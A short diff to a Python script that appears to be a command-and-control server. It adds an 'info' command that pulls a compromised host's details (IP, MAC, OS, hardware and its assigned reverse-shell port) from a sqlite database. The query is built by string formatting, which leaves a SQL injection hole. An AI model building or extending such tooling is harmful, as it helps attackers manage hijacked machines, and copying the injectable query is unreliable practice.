@@ -78,4 +78,20 @@ while True:
         int_port = int(port)
         main(int_port)
 
-# Establish connection with a client (socket must be listening)
+    elif "info" in cmd:
+        uuid = cmd.split(" ")[1]
+        con = sqlite3.connect("users")
+        cur = con.cursor()
+        cur = cur.execute("SELECT * FROM users WHERE ID='{}';".format(uuid))
+        info = cur.fetchone()
+        print("Machine Name : {}".format(info[1]))
+        print("IP : {}".format(info[2]))
+        print("MAC adress : {}".format(info[3]))
+        print("Platform : {}".format(info[4]))
+        print("OS type : {}".format(info[5]))
+        print("Bits : {}".format(info[7]))
+        print("Number of CPU core: {}".format(info[8]))
+        print("Maximum frequency of CPU : {} Hz".format(info[9]))
+        print("RAM : {} go".format(info[11]))
+        print("Broadcast IP : {}".format(info[12]))
+        print("Attributed Port for reverse Shell : {}".format(info[15]))
